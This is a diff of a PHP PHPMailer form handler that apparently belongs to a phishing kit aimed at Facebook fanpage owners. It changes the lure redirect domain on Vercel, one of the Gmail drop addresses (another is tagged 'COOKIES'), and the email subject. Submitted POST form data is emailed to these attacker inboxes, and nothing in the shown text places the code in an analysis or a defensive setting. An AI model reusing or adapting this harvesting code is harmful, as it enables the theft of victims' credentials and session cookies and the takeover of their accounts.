@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://free-team-request-for-fanpage-apply.vercel.app/");
+header("Location: https://apply-fanpage-for-team-request-on.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'COOKIES');
-        $mail->addAddress('opportunity.get.verified.today@gmail.com');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
        
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RASHID';
+        $mail->Subject = 'ZUBAIR';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
